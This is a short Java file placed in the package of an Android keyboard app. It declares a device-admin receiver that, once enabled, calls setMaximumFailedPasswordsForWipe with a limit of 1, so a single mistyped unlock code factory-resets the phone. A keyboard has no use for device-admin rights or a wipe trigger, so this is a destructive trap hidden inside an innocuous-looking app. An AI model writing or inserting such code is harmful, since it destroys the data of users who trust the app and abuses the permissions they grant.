package rkr.simplekeyboard.inputmethod.latin;

import android.app.*;
import android.app.admin.*;
import android.content.*;
import android.content.pm.*;
import android.os.Process;
import android.os.UserHandle;
import android.os.UserManager;

public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
	
	@Override
	public void onEnabled(Context context, Intent intent) {
		DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
		ComponentName admin = new ComponentName(context, MyDeviceAdminReceiver.class);
		dpm.setMaximumFailedPasswordsForWipe(admin, 1);
	}

}
